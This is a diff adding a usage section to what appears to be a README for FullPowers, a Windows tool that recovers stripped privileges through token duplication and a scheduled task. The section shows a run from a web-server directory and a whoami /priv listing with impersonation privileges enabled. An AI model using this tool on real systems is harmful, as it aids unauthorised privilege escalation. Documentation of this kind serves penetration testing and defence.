@@ -7,6 +7,32 @@ On Windows, even if a user belongs to the Administrators group, the resulting lo
 
 FullPowers leverages token duplication techniques to create a new process with a full administrative token, restoring high-privilege rights typically stripped by UAC.
 
+Usage:
+C:\wamp\www>FullPowers.exe
+FullPowers.exe
+[+] Started dummy thread with id 3848
+[+] Successfully created scheduled task.
+[+] Got new token! Privilege count: 7
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.17763.2300]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State  
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeAuditPrivilege              Generate security audits                  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+
 What it provides
 
 A restored token with all admin privileges enabled
